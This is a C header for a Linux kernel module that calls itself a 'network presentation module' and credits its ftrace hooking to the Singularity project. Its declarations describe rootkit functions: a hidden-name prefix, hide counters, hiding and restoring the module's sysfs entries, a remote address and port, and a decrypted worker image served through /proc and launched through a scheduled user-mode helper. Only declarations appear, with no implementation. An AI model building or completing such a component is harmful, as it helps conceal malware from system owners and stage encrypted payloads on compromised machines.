/* SPDX-License-Identifier: GPL-2.0 */
/*
 * em_ksnftc - network presentation module.
 * ftrace hooking pattern derived from Singularity (MIT),
 * Copyright (c) 2025 matheuz, https://github.com/MatheuZSecurity/Singularity
 */
#ifndef EM_KSNFTC_H
#define EM_KSNFTC_H

#include <linux/atomic.h>

extern char *hidden_prefix;
extern unsigned int remote_addr;
extern unsigned short remote_port;
extern bool filter_enabled;

extern atomic64_t em_ksnftc_syscall_hits;
extern atomic64_t em_ksnftc_packet_hits;
extern atomic64_t em_ksnftc_hide_hits;
extern atomic64_t em_ksnftc_umh_state;

/* Decrypted worker image, served to the loader via /proc/ksnftc_img. */
extern char *em_ksnftc_img_data;
extern unsigned int em_ksnftc_img_len;

int em_ksnftc_install_hooks(void);
void em_ksnftc_remove_hooks(void);
int em_ksnftc_umh_schedule(unsigned int delay_sec);
void em_ksnftc_umh_cancel(void);
void em_ksnftc_img_free(void);
void em_ksnftc_hide_sysfs(void);
void em_ksnftc_restore_sysfs(void);

#endif
